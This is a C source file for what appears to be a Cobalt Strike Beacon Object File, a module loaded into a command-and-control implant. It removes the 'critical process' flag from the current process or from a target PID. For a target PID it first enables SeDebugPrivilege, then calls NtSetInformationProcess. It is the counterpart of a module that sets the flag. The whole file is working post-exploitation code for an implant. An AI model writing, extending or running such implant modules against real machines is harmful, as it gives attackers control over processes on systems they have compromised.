/*
 * proc_critical_unset.c — Remove critical (system) flag from a process.
 *
 * Reverses proc_critical_set: clears ProcessBreakOnTermination so the
 * process can be terminated normally without triggering a BSOD.
 *
 * Args (optional): "<pid>"
 *   If PID is omitted, defaults to the current process.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -c proc_critical_unset.c -o proc_critical_unset.o
 */

#include <windows.h>
#include "beacon.h"

/* ── BOF API Imports ── */
DECLSPEC_IMPORT LONG   WINAPI NTDLL$NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetCurrentProcessId(void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetModuleFileNameA(HMODULE, LPSTR, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PVOID);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PVOID, DWORD, PVOID, PDWORD);

#define ProcessBreakOnTermination 0x1D
#define PROCESS_SET_INFORMATION   0x0200
#define SE_PRIVILEGE_ENABLED      0x00000002

/* ── No-CRT helpers ── */
static void bof_memset(void* d, int v, unsigned long long n) {
    unsigned char* p = (unsigned char*)d;
    while (n--) *p++ = (unsigned char)v;
}
static void bof_memcpy(void* d, const void* s, unsigned long long n) {
    unsigned char* pd = (unsigned char*)d;
    const unsigned char* ps = (const unsigned char*)s;
    while (n--) *pd++ = *ps++;
}
static int bof_strlen(const char* s) { int n = 0; while (s[n]) n++; return n; }
static int sa(char* dst, int pos, const char* src) {
    int len = bof_strlen(src);
    bof_memcpy(dst + pos, src, len);
    return pos + len;
}
static int uitoa(char* buf, unsigned long v) {
    if (v == 0) { buf[0] = '0'; return 1; }
    char tmp[12]; int ti = 0;
    while (v) { tmp[ti++] = '0' + (v % 10); v /= 10; }
    for (int i = 0; i < ti; i++) buf[i] = tmp[ti - 1 - i];
    return ti;
}
static unsigned int bof_atoi(const char* s) {
    unsigned int r = 0;
    while (*s >= '0' && *s <= '9') { r = r * 10 + (*s - '0'); s++; }
    return r;
}

/* Enable SeDebugPrivilege */
static void enable_debug_priv(void) {
    HANDLE hToken;
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), 0x0020 | 0x0008, &hToken))
        return;

    char tp[16];
    bof_memset(tp, 0, 16);
    *(DWORD*)tp = 1;
    ADVAPI32$LookupPrivilegeValueA(NULL, "SeDebugPrivilege", tp + 4);
    *(DWORD*)(tp + 12) = SE_PRIVILEGE_ENABLED;

    ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, tp, 0, NULL, NULL);
    KERNEL32$CloseHandle(hToken);
}

void go(char* args, int alen)
{
    char* input = NULL;
    int input_len = 0;

    if (args && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        input = BeaconDataExtract(&parser, &input_len);
    }

    DWORD targetPid = 0;
    HANDLE hProc = NULL;
    int selfTarget = 0;

    if (input && input_len > 0) {
        char buf[32];
        int cl = input_len < 31 ? input_len : 31;
        bof_memcpy(buf, input, cl);
        buf[cl] = '\0';
        targetPid = (DWORD)bof_atoi(buf);
    }

    if (targetPid == 0) {
        targetPid = KERNEL32$GetCurrentProcessId();
        hProc = KERNEL32$GetCurrentProcess();
        selfTarget = 1;
    } else {
        enable_debug_priv();
        hProc = KERNEL32$OpenProcess(PROCESS_SET_INFORMATION, FALSE, targetPid);
        if (!hProc) {
            char err[128]; int ep = 0;
            ep = sa(err, ep, "[Critical] OpenProcess failed for PID ");
            ep += uitoa(err + ep, targetPid);
            ep = sa(err, ep, " (access denied?)\n");
            BeaconOutput(CALLBACK_ERROR, err, ep);
            return;
        }
    }

    /* Set ProcessBreakOnTermination = FALSE */
    ULONG val = 0;
    LONG status = NTDLL$NtSetInformationProcess(hProc, ProcessBreakOnTermination, &val, sizeof(val));

    if (!selfTarget && hProc) {
        KERNEL32$CloseHandle(hProc);
    }

    char out[512]; int op = 0;
    if (status == 0) {
        op = sa(out, op, "[Critical] Process UNSET from critical (normal process)\n");
        op = sa(out, op, "  PID : "); op += uitoa(out + op, targetPid); out[op++] = '\n';
        if (selfTarget) {
            char exePath[512];
            DWORD elen = KERNEL32$GetModuleFileNameA(NULL, exePath, sizeof(exePath));
            if (elen > 0 && elen < sizeof(exePath)) {
                exePath[elen] = '\0';
                op = sa(out, op, "  Path: "); op = sa(out, op, exePath); out[op++] = '\n';
            }
        }
        op = sa(out, op, "  Process can now be terminated normally.\n");
        BeaconOutput(CALLBACK_OUTPUT, out, op);
    } else {
        op = sa(out, op, "[Critical] NtSetInformationProcess failed (NTSTATUS 0x");
        for (int i = 7; i >= 0; i--) {
            int nib = ((unsigned long)status >> (i * 4)) & 0xF;
            out[op++] = nib < 10 ? '0' + nib : 'A' + nib - 10;
        }
        op = sa(out, op, ")\n  Need SeDebugPrivilege / admin.\n");
        BeaconOutput(CALLBACK_ERROR, out, op);
    }
}
